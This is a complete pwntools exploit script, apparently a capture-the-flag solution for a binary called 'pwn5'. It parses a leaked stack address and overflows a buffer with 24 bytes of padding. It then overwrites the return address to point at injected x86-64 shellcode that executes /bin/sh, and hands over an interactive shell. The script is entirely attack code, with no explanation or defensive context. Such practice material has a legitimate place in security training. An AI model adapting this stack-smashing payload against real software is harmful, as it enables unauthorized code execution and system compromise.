from pwn import *
context.log_level = 'debug'
  
sh = process('./pwn5')


sh.recvuntil("Do your kown what is it : [")

ebp_16 = sh.recv()[:14]
print ebp_16
ebp_16 = int(ebp_16,16)
print ebp_16
ebp = ebp_16 + 16  

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
bss = 0x0000555555755000

payload = 'a' * 24 + p64(ebp+16) + shellcode

sh.sendline(payload)

sh.interactive()
